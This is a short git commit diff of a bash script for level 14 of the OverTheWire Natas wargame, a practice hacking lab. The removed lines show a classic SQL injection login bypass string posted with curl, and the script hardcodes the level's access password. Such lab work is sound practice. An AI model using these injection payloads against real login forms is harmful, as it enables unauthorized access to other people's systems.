cc8a73966e8f7290562313e2dd78c830d165dbc3
Clouz <clouz85@gmail.com>
2017-11-02 08:30:37 +0100

    natas 14 test

--- Natas/natas14.bash
+++ Natas/natas14.bash
@@ -1,7 +1,7 @@
 usr="natas14"
 psw="Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
 
-user1="\" OR 1=1 --"
-psw1=""
+user1="ciao"
+psw1="ciao"
 
-curl --user "$usr:$psw" -X POST --form "username=$user1" --form "password=$psw1" -H "debug:1"  http://$usr.natas.labs.overthewire.org/ 
+curl --user "$usr:$psw" http://$usr.natas.labs.overthewire.org/?debug=1&username=$user1&password=$psw1 
